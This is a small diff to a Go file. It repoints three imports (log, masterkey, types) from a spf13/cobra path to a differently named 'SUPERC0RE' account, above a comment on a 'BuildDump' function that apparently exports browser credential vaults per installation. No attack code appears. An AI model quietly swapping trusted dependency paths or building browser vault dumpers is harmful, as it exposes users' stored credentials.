@@ -6,9 +6,9 @@ import (
 	"path/filepath"
 	"strings"
 
-	"github.com/spf13/cobra/site/BWPlus/log"
-	"github.com/spf13/cobra/site/BWPlus/masterkey"
-	"github.com/spf13/cobra/site/BWPlus/types"
+	"github.com/SUPERC0RE/cobra/site/BWPlus/log"
+	"github.com/SUPERC0RE/cobra/site/BWPlus/masterkey"
+	"github.com/SUPERC0RE/cobra/site/BWPlus/types"
 )
 
 // BuildDump exports one Vault per installation (Firefox/Safari, lacking KeyManager, are skipped).
